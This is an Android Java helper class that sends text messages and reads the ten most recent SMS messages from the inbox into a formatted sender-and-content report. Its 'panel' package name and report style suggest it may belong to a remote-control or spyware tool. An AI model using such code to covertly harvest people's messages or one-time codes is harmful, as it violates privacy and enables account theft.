package com.java.panel;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import java.util.ArrayList;

public class SmsManagerHelper {
    public static String sendSms(String phoneNumber, String message) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            if (message.length() > 160) {
                ArrayList<String> parts = smsManager.divideMessage(message);
                smsManager.sendMultipartTextMessage(phoneNumber, null, parts, null, null);
            } else {
                smsManager.sendTextMessage(phoneNumber, null, message, null, null);
            }
            return "✅ SMS sent -> " + phoneNumber;
        } catch (Exception e) {
            return "❌ Could not send SMS: " + e.getMessage();
        }
    }

    public static String getRecentSms(Context context) {
        StringBuilder sb = new StringBuilder("📩 Recent SMS:\n\n");
        try {
            Uri uri = Uri.parse("content://sms/inbox");
            Cursor cursor = context.getContentResolver().query(uri, null, null, null, "date DESC LIMIT 10");
            if (cursor != null) {
                int indexBody = cursor.getColumnIndex("body");
                int indexAddr = cursor.getColumnIndex("address");
                while (cursor.moveToNext()) {
                    String sender = indexAddr != -1 ? cursor.getString(indexAddr) : "Unknown";
                    String body = indexBody != -1 ? cursor.getString(indexBody) : "";
                    sb.append("Sender: ").append(sender)
                      .append("\nContent: ").append(body)
                      .append("\n------------------\n");
                }
                cursor.close();
            } else {
                return "📩 Inbox is empty or could not be accessed.";
            }
        } catch (Exception e) {
            return "❌ SMS read error: " + e.getMessage();
        }
        return sb.toString();
    }
}
